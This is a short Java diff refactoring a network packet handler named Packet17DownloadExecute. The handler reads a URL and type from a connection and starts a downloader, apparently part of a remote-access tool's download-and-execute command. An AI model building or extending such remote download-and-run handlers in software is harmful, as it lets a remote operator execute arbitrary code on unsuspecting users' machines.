@@ -7,11 +7,11 @@ public class Packet17DownloadExecute extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String url = Connection.instance.readLine();
-		String type = Connection.instance.readLine();
-		boolean readFromSocket = Connection.instance.readBoolean();
+		String url = con.readLine();
+		String type = con.readLine();
+		boolean readFromSocket = con.readBoolean();
 
-		new Downloader(url, false, type, readFromSocket).start();
+		new Downloader(con, url, false, type, readFromSocket).start();
 	}
 
 }
